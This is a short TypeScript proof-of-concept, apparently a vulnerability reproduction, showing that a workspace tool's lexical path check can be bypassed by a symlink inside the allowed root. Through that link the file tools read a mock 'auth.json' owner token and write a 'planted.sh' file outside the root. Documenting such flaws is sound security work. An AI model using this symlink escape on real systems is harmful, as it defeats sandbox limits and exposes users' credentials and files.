// Path containment is lexical on Linux: a symlink inside the workspace root lets
// read/write file tools reach files outside every allowed root.
import { mkdtempSync, mkdirSync, symlinkSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
const SRC = process.env.DEVSPACE_SRC!;
const { readFileTool, writeFileTool } = await import(`${SRC}/pi-tools.ts`);
const { assertAllowedPath } = await import(`${SRC}/roots.ts`);
const base = mkdtempSync(join(tmpdir(), "ds-symlink-"));
const root = join(base, "allowed-root"); const outside = join(base, "outside-secret");
mkdirSync(root); mkdirSync(outside);
writeFileSync(join(outside, "auth.json"), '{"ownerToken":"TOP-SECRET"}');
symlinkSync(outside, join(root, "vendor-link"), "dir");       // e.g. committed in a cloned repo
const ctx = { root, cwd: root };
console.log("assertAllowedPath(vendor-link/auth.json) ->", assertAllowedPath(join(root, "vendor-link/auth.json"), [root]));
try { assertAllowedPath(join(outside, "auth.json"), [root]); } catch (e: any) { console.log("direct outside path ->", e.name); }
const r = await readFileTool({ path: "vendor-link/auth.json" }, ctx);
console.log("read isError:", !!r.isError, "content:", JSON.stringify(r.content?.[0]?.text ?? r.content).slice(0, 80));
const w = await writeFileTool({ path: "vendor-link/planted.sh", content: "echo pwned\n" }, ctx);
console.log("write isError:", !!w.isError, "| file created OUTSIDE root:", existsSync(join(outside, "planted.sh")), readFileSync(join(outside, "planted.sh"), "utf8").trim());
